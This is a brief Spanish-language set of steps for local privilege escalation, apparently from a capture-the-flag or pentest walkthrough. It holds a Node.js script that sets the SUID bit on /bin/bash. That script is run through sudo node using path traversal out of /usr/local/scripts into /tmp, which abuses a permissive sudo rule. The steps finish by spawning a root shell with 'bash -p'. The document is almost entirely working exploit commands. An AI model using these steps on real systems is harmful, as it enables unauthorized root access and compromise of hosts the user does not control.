Crea un archivo .js en la carpeta tmp y coloca el codigo

```js
const { exec } = require("child_process");  
  
exec("chmod u+s /bin/bash", (error, stdout, stderr) => {  
if (error) {  
console.log(`error: ${error.message}`);  
return;  
}  
if (stderr) {  
console.log(`stderr: ${stderr}`);  
return;  
}  
console.log(`stdout: ${stdout}`);  
});

```

despues

```bash

sudo /usr/bin/node /usr/local/scripts/../../../../../../tmp/archivo.js
```

```bash
/bin/bash -p
```
